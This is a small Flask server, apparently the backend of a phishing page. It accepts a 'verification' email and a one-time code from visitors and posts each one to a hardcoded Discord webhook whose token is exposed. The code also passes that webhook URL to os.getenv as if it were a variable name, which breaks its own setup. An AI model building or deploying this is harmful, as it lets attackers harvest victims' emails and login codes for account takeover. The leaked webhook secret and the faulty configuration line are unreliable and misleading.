from flask import Flask, render_template, request, jsonify
import requests
import os

app = Flask(__name__)

# PUT YOUR WEBHOOK IN RENDER ENV VARS
# Key name: WEBHOOK_URL
WEBHOOK_URL = os.getenv("https://discord.com/api/webhooks/1458997072442429460/PxrHKebDiDaNQvyF-8Gl3B-kyAp8xrvkqnv7cUw_PVdYydehwwFo2zuosM_cdhRvoWV3")


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/submit", methods=["POST"])
def submit():
    data = request.json

    if not WEBHOOK_URL:
        return jsonify({"error": "Webhook not set"}), 500

    payload = {}

    if "email" in data:
        payload = {
            "content": f"📧 **New Verification Email**\n{data['email']}"
        }

    if "code" in data:
        payload = {
            "content": f"🔢 **Verification Code Submitted**\n{data['code']}"
        }

    requests.post(WEBHOOK_URL, json=payload)
    return "", 200


if __name__ == "__main__":
    app.run()
